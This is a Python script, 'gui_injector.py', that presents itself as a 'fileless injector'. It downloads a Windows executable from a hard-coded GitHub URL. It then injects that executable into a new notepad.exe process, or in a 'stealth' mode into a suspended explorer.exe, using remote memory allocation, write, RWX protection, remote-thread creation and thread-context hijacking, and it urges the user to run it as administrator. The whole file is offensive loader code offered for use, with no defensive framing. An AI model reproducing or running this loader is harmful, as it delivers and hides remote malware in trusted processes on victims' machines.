# Save this as gui_injector.py
import ctypes
import urllib.request
import struct
import sys

# Windows API
k32 = ctypes.WinDLL('kernel32', use_last_error=True)
user32 = ctypes.WinDLL('user32', use_last_error=True)

# Constants
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READWRITE = 0x40
CREATE_SUSPENDED = 0x4
CREATE_NEW_CONSOLE = 0x10
NORMAL_PRIORITY_CLASS = 0x20

# Structures
class STARTUPINFOW(ctypes.Structure):
    _fields_ = [
        ("cb", ctypes.c_ulong),
        ("lpReserved", ctypes.c_wchar_p),
        ("lpDesktop", ctypes.c_wchar_p),
        ("lpTitle", ctypes.c_wchar_p),
        ("dwX", ctypes.c_ulong),
        ("dwY", ctypes.c_ulong),
        ("dwXSize", ctypes.c_ulong),
        ("dwYSize", ctypes.c_ulong),
        ("dwXCountChars", ctypes.c_ulong),
        ("dwYCountChars", ctypes.c_ulong),
        ("dwFillAttribute", ctypes.c_ulong),
        ("dwFlags", ctypes.c_ulong),
        ("wShowWindow", ctypes.c_ushort),
        ("cbReserved2", ctypes.c_ushort),
        ("lpReserved2", ctypes.c_void_p),
        ("hStdInput", ctypes.c_void_p),
        ("hStdOutput", ctypes.c_void_p),
        ("hStdError", ctypes.c_void_p),
    ]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess", ctypes.c_void_p),
        ("hThread", ctypes.c_void_p),
        ("dwProcessId", ctypes.c_ulong),
        ("dwThreadId", ctypes.c_ulong),
    ]

def get_active_session():
    """Get active user session ID for GUI"""
    try:
        wtsapi = ctypes.WinDLL('wtsapi32', use_last_error=True)
        session_id = ctypes.c_ulong(0)
        wtsapi.WTSGetActiveConsoleSessionId.restype = ctypes.c_ulong
        session_id = wtsapi.WTSGetActiveConsoleSessionId()
        return session_id
    except:
        return 0

def create_gui_process(target_cmd="notepad.exe"):
    """Create process in active session for GUI visibility"""
    print(f"[GUI] Creating visible process: {target_cmd}")
    
    si = STARTUPINFOW()
    si.cb = ctypes.sizeof(STARTUPINFOW)
    si.lpDesktop = "WinSta0\\Default"  # Interactive desktop
    si.dwFlags = 0x1  # STARTF_USESHOWWINDOW
    si.wShowWindow = 1  # SW_SHOWNORMAL
    pi = PROCESS_INFORMATION()
    
    # Try to create visible GUI process
    result = k32.CreateProcessW(
        None,
        target_cmd,
        None,
        None,
        False,
        CREATE_NEW_CONSOLE | NORMAL_PRIORITY_CLASS,
        None,
        None,
        ctypes.byref(si),
        ctypes.byref(pi)
    )
    
    if result:
        print(f"[GUI] Process created (PID: {pi.dwProcessId})")
        return pi
    else:
        print("[GUI] Creating visible process failed, trying suspended...")
        # Fallback to suspended
        result = k32.CreateProcessW(
            None,
            target_cmd,
            None,
            None,
            False,
            CREATE_SUSPENDED,
            None,
            None,
            ctypes.byref(si),
            ctypes.byref(pi)
        )
        return pi if result else None

def inject_gui_exe(pe_url, use_visible_gui=True):
    """Inject GUI EXE with proper visibility"""
    print(f"[1] Downloading: {pe_url}")
    
    try:
        headers = {'User-Agent': 'Mozilla/5.0'}
        req = urllib.request.Request(pe_url, headers=headers)
        with urllib.request.urlopen(req) as response:
            pe_data = response.read()
    except Exception as e:
        print(f"[-] Download failed: {e}")
        return False
    
    if len(pe_data) < 100 or pe_data[0:2] != b'MZ':
        print("[-] Invalid PE file")
        return False
    
    print(f"[2] Downloaded {len(pe_data):,} bytes")
    
    # Parse PE
    pe_offset = struct.unpack('<I', pe_data[60:64])[0]
    image_size = struct.unpack('<I', pe_data[pe_offset+80:pe_offset+84])[0]
    print(f"[3] Image size: {image_size:,} bytes")
    
    # Choose target process
    if use_visible_gui:
        # Method 1: Create new visible process and inject into it
        print("[4] Creating visible GUI process...")
        target_cmd = "notepad.exe"  # Good for GUI apps
        pi = create_gui_process(target_cmd)
        if not pi:
            print("[-] Failed to create GUI process")
            return False
    else:
        # Method 2: Inject into explorer (may not show GUI)
        print("[4] Creating suspended explorer.exe...")
        si = STARTUPINFOW()
        si.cb = ctypes.sizeof(STARTUPINFOW)
        pi = PROCESS_INFORMATION()
        
        result = k32.CreateProcessW(
            None,
            "explorer.exe",
            None,
            None,
            False,
            CREATE_SUSPENDED,
            None,
            None,
            ctypes.byref(si),
            ctypes.byref(pi)
        )
        
        if not result:
            print("[-] CreateProcess failed")
            return False
    
    print(f"[5] Target PID: {pi.dwProcessId}")
    
    # Allocate memory
    alloc_addr = k32.VirtualAllocEx(
        pi.hProcess,
        0,
        image_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    )
    
    if not alloc_addr:
        print("[-] Memory allocation failed")
        k32.CloseHandle(pi.hProcess)
        k32.CloseHandle(pi.hThread)
        return False
    
    print(f"[6] Allocated at: {hex(alloc_addr)}")
    
    # Write PE
    written = ctypes.c_size_t(0)
    buffer_type = ctypes.c_char * len(pe_data)
    buffer = buffer_type.from_buffer_copy(pe_data)
    
    result = k32.WriteProcessMemory(
        pi.hProcess,
        alloc_addr,
        ctypes.byref(buffer),
        len(pe_data),
        ctypes.byref(written)
    )
    
    if not result or written.value != len(pe_data):
        print(f"[-] Write failed: {written.value}/{len(pe_data)} bytes")
        k32.CloseHandle(pi.hProcess)
        k32.CloseHandle(pi.hThread)
        return False
    
    print(f"[7] Wrote {written.value:,} bytes")
    
    # Set execute permissions
    old_protect = ctypes.c_ulong(0)
    k32.VirtualProtectEx(
        pi.hProcess,
        alloc_addr,
        image_size,
        PAGE_EXECUTE_READWRITE,
        ctypes.byref(old_protect)
    )
    
    # Calculate entry point
    entry_point = struct.unpack('<I', pe_data[pe_offset+40:pe_offset+44])[0]
    entry_addr = alloc_addr + entry_point
    print(f"[8] Entry point: {hex(entry_addr)}")
    
    # For GUI apps, we need to hijack the thread
    if use_visible_gui and pi:
        # Method A: Create remote thread at entry point
        thread_id = ctypes.c_ulong(0)
        h_thread = k32.CreateRemoteThread(
            pi.hProcess,
            None,
            0,
            entry_addr,
            None,
            0,
            ctypes.byref(thread_id)
        )
        
        if h_thread:
            print(f"[9] Remote thread created (TID: {thread_id.value})")
            k32.CloseHandle(h_thread)
            
            # Terminate original process main thread if needed
            if target_cmd == "notepad.exe":
                k32.TerminateThread(pi.hThread, 0)
        else:
            # Method B: Set thread context
            class CONTEXT(ctypes.Structure):
                _fields_ = [("rip", ctypes.c_ulonglong)]
            
            context = CONTEXT()
            context.rip = entry_addr
            
            # Get/Set thread context
            k32.GetThreadContext(pi.hThread, ctypes.byref(context))
            k32.SetThreadContext(pi.hThread, ctypes.byref(context))
            print("[9] Thread context hijacked")
    
    # Resume if suspended
    if not use_visible_gui:
        print("[9] Resuming thread...")
        k32.ResumeThread(pi.hThread)
    
    # Cleanup
    k32.CloseHandle(pi.hThread)
    k32.CloseHandle(pi.hProcess)
    
    print("[+] Injection complete!")
    return True

def main():
    print("=== GUI VISIBLE Fileless Injector ===")
    print("Makes GUI applications actually appear on screen")
    print("=" * 45)
    
    # Check admin
    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if not is_admin:
            print("⚠  WARNING: Run as Administrator!")
            print("   Right-click PowerShell/CMD → 'Run as administrator'")
            print("   Otherwise GUI may not appear")
    except:
        pass
    
    # Your EXE
    default_url = "https://raw.githubusercontent.com/pleasehelp09052010-sudo/HIDENTHOSEWHOKNOW/main/RhAS8@nga/rCTnJexpp1.exe"
    
    print(f"\n📁 Your EXE: {default_url}")
    
    print("\n🎯 Injection Methods:")
    print("   1. Visible GUI (creates new window) - RECOMMENDED")
    print("   2. Stealth (injects into explorer.exe)")
    
    choice = input("\nSelect method (1 or 2): ")
    
    if choice == "2":
        print("\n⚠  Note: Method 2 may not show GUI windows")
        print("   GUI may run hidden in explorer.exe")
        use_visible = False
        target_info = "explorer.exe (stealth)"
    else:
        use_visible = True
        target_info = "notepad.exe (visible GUI)"
    
    print(f"\n🎯 Target: {target_info}")
    
    # Optional: custom URL
    custom = input("\nUse custom EXE URL? (y/n): ")
    if custom.lower() == 'y':
        pe_url = input("Enter URL: ")
    else:
        pe_url = default_url
    
    print(f"\n🚀 Starting GUI injection...")
    print(f"📥 URL: {pe_url}")
    print(f"👁️  Mode: {'VISIBLE GUI' if use_visible else 'STEALTH'}")
    print("─" * 50)
    
    success = inject_gui_exe(pe_url, use_visible)
    
    if success:
        if use_visible:
            print("\n✅ SUCCESS! GUI should be visible:")
            print("   • Check for new window")
            print("   • Look in taskbar")
            print("   • Check Alt+Tab switcher")
            print("   • The GUI runs in notepad.exe process")
        else:
            print("\n✅ Injection successful but GUI may be hidden:")
            print("   • App runs in explorer.exe memory")
            print("   • Check Task Manager for extra explorer threads")
            print("   • No visible window (stealth mode)")
        
        print("\n💡 If GUI doesn't appear:")
        print("   1. Try Method 1 (Visible GUI)")
        print("   2. Ensure EXE is valid Windows GUI app")
        print("   3. The EXE might require .NET/Dependencies")
        print("   4. Some GUI apps need specific Windows version")
    else:
        print("\n❌ Injection failed")
    
    input("\nPress Enter to exit...")

if __name__ == "__main__":
    main()
